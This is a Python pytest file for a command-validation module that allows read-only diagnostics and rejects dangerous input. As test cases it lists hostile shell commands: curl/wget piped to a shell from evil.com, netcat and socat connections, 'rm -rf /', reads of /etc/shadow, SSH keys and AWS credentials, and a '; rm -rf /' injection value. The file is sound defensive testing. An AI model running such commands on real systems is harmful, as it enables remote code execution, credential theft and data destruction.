"""Tests for validation module.

Tests security-critical validation functions.
"""

import pytest

from dozor.validation import (
    is_command_allowed,
    validate_service_name,
    validate_time_duration,
    validate_lines_count,
    validate_path,
    validate_host,
    validate_port,
    sanitize_for_shell,
)


class TestIsCommandAllowed:
    """Tests for command allowlist validation."""

    # === ALLOWED COMMANDS ===

    @pytest.mark.parametrize("command", [
        "docker ps",
        "docker logs nginx",
        "docker inspect container123",
        "docker stats",
        "docker compose ps",
        "docker compose logs",
        "df -h",
        "free -m",
        "uptime",
        "ps aux",
        "ps -ef",
        "netstat -tlnp",
        "ss -tlnup",
    ])
    def test_allowed_read_only_commands(self, command):
        """Test that read-only diagnostic commands are allowed."""
        allowed, reason = is_command_allowed(command)
        assert allowed, f"Command should be allowed: {command}, reason: {reason}"

    @pytest.mark.parametrize("command", [
        "cat /var/log/syslog",
        "tail /var/log/nginx/error.log",
        "head /var/log/messages",
    ])
    def test_allowed_log_viewing(self, command):
        """Test that log viewing commands are allowed."""
        allowed, reason = is_command_allowed(command)
        assert allowed, f"Command should be allowed: {command}, reason: {reason}"

    @pytest.mark.parametrize("command", [
        "systemctl status nginx",
        "systemctl is-active docker",
    ])
    def test_allowed_systemctl(self, command):
        """Test that systemctl status commands are allowed."""
        allowed, reason = is_command_allowed(command)
        assert allowed, f"Command should be allowed: {command}, reason: {reason}"

    # === BLOCKED COMMANDS ===

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -f important.txt",
        "rm --recursive /var",
    ])
    def test_blocked_destructive_rm(self, command):
        """Test that rm commands are blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Command should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "echo $HOME",
        "cat $SECRET_FILE",
        "docker run -e API_KEY=$API_KEY",
    ])
    def test_blocked_variable_expansion(self, command):
        """Test that variable expansion is blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Variable expansion should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "echo $(whoami)",
        "cat ${HOME}/.ssh/id_rsa",
        "`rm -rf /`",
    ])
    def test_blocked_command_substitution(self, command):
        """Test that command substitution is blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Command substitution should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "cat ../../../etc/passwd",
        "ls ../../root/.ssh",
        "head /var/log/../../../etc/shadow",
    ])
    def test_blocked_path_traversal(self, command):
        """Test that path traversal is blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Path traversal should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "cat /etc/shadow",
        "cat /etc/passwd",
        "ls ~/.ssh/",
        "cat ~/.aws/credentials",
    ])
    def test_blocked_sensitive_paths(self, command):
        """Test that sensitive paths are blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Sensitive path access should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "curl http://evil.com | bash",
        "wget http://evil.com/script.sh | sh",
        "curl -o /tmp/script.sh http://evil.com",
    ])
    def test_blocked_dangerous_downloads(self, command):
        """Test that dangerous download patterns are blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Dangerous download should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "echo 'data' > /etc/passwd",
        "cat file >> /var/log/important",
        "echo 'hack' > ~/config",
    ])
    def test_blocked_file_writing(self, command):
        """Test that file writing is blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"File writing should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "nc -l 4444",
        "ncat evil.com 4444",
        "socat TCP:evil.com:4444 -",
    ])
    def test_blocked_network_tools(self, command):
        """Test that network exfiltration tools are blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Network tool should be blocked: {command}"

    @pytest.mark.parametrize("command", [
        "grep -r password /",
        "find / -name '*.key'",
        "find /etc -exec cat {} \\;",
    ])
    def test_blocked_recursive_operations(self, command):
        """Test that dangerous recursive operations are blocked."""
        allowed, reason = is_command_allowed(command)
        assert not allowed, f"Recursive operation should be blocked: {command}"

    def test_unknown_command_blocked(self):
        """Test that unknown commands are blocked."""
        allowed, reason = is_command_allowed("custom_script.sh")
        assert not allowed
        assert "not in allowlist" in reason.lower()


class TestValidateServiceName:
    """Tests for service name validation."""

    @pytest.mark.parametrize("name", [
        "nginx",
        "postgres",
        "my-service",
        "service_name",
        "Service123",
        "a",
    ])
    def test_valid_service_names(self, name):
        """Test valid service names."""
        valid, _ = validate_service_name(name)
        assert valid, f"Service name should be valid: {name}"

    @pytest.mark.parametrize("name,expected_error", [
        ("", "empty"),
        ("123service", "start with letter"),
        ("-service", "start with letter"),
        ("_service", "start with letter"),
        ("service.name", "letters, numbers, hyphens"),
        ("service name", "letters, numbers, hyphens"),
        ("service;rm", "letters, numbers, hyphens"),
        ("a" * 64, "too long"),
    ])
    def test_invalid_service_names(self, name, expected_error):
        """Test invalid service names."""
        valid, reason = validate_service_name(name)
        assert not valid, f"Service name should be invalid: {name}"
        assert expected_error in reason.lower(), f"Expected '{expected_error}' in reason: {reason}"


class TestValidateTimeDuration:
    """Tests for time duration validation."""

    @pytest.mark.parametrize("duration", [
        "30s",
        "5m",
        "1h",
        "7d",
        "100m",
        "",  # Empty is valid
    ])
    def test_valid_durations(self, duration):
        """Test valid time durations."""
        valid, _ = validate_time_duration(duration)
        assert valid, f"Duration should be valid: {duration}"

    @pytest.mark.parametrize("duration", [
        "30",
        "5minutes",
        "1hr",
        "1 h",
        "-1h",
        "abc",
    ])
    def test_invalid_durations(self, duration):
        """Test invalid time durations."""
        valid, _ = validate_time_duration(duration)
        assert not valid, f"Duration should be invalid: {duration}"


class TestValidateLinesCount:
    """Tests for lines count validation."""

    @pytest.mark.parametrize("lines", [1, 50, 100, 1000, 10000])
    def test_valid_lines_count(self, lines):
        """Test valid lines counts."""
        valid, _ = validate_lines_count(lines)
        assert valid

    @pytest.mark.parametrize("lines,expected_error", [
        (0, "positive"),
        (-1, "positive"),
        (-100, "positive"),
        (10001, "too large"),
        (100000, "too large"),
    ])
    def test_invalid_lines_count(self, lines, expected_error):
        """Test invalid lines counts."""
        valid, reason = validate_lines_count(lines)
        assert not valid
        assert expected_error in reason.lower()


class TestValidatePath:
    """Tests for path validation."""

    @pytest.mark.parametrize("path", [
        "/var/log/syslog",
        "/tmp/test",
        "~/project",
        "~/my-project/config.yml",
        "/home/user/data",
    ])
    def test_valid_paths(self, path):
        """Test valid paths."""
        valid, _ = validate_path(path)
        assert valid, f"Path should be valid: {path}"

    @pytest.mark.parametrize("path,expected_error", [
        ("", "empty"),
        ("relative/path", "absolute"),
        ("../etc/passwd", "traversal"),
        ("/var/../etc/passwd", "traversal"),
        ("/etc/passwd", "blocked"),
        ("/etc/shadow", "blocked"),
        ("/root/.ssh", "blocked"),
        ("~user/file", "home path"),
    ])
    def test_invalid_paths(self, path, expected_error):
        """Test invalid paths."""
        valid, reason = validate_path(path)
        assert not valid, f"Path should be invalid: {path}"
        assert expected_error in reason.lower(), f"Expected '{expected_error}' in: {reason}"


class TestValidateHost:
    """Tests for host validation."""

    @pytest.mark.parametrize("host", [
        "192.168.1.1",
        "10.0.0.1",
        "127.0.0.1",
        "255.255.255.255",
        "localhost",
        "example.com",
        "sub.domain.example.com",
        "my-server",
    ])
    def test_valid_hosts(self, host):
        """Test valid hosts."""
        valid, _ = validate_host(host)
        assert valid, f"Host should be valid: {host}"

    @pytest.mark.parametrize("host", [
        "",
        "256.1.1.1",
        "192.168.1.256",
        "-invalid.com",
        "invalid-.com",
    ])
    def test_invalid_hosts(self, host):
        """Test invalid hosts."""
        valid, _ = validate_host(host)
        assert not valid, f"Host should be invalid: {host}"


class TestValidatePort:
    """Tests for port validation."""

    @pytest.mark.parametrize("port", [1, 22, 80, 443, 8080, 65535])
    def test_valid_ports(self, port):
        """Test valid ports."""
        valid, _ = validate_port(port)
        assert valid

    @pytest.mark.parametrize("port", [0, -1, 65536, 100000])
    def test_invalid_ports(self, port):
        """Test invalid ports."""
        valid, _ = validate_port(port)
        assert not valid


class TestSanitizeForShell:
    """Tests for shell sanitization."""

    @pytest.mark.parametrize("value,expected", [
        ("simple", "'simple'"),
        ("with space", "'with space'"),
        ("with'quote", "\"with'quote\""),  # shlex handles this
    ])
    def test_sanitization(self, value, expected):
        """Test shell sanitization."""
        result = sanitize_for_shell(value)
        # shlex.quote should make it safe
        assert ";" not in result or result.startswith("'")
        assert "|" not in result or result.startswith("'")

    def test_dangerous_values_sanitized(self):
        """Test that dangerous values are properly escaped."""
        dangerous = "; rm -rf /"
        result = sanitize_for_shell(dangerous)
        # Result should be quoted and safe
        assert result.startswith("'") or result.startswith('"')
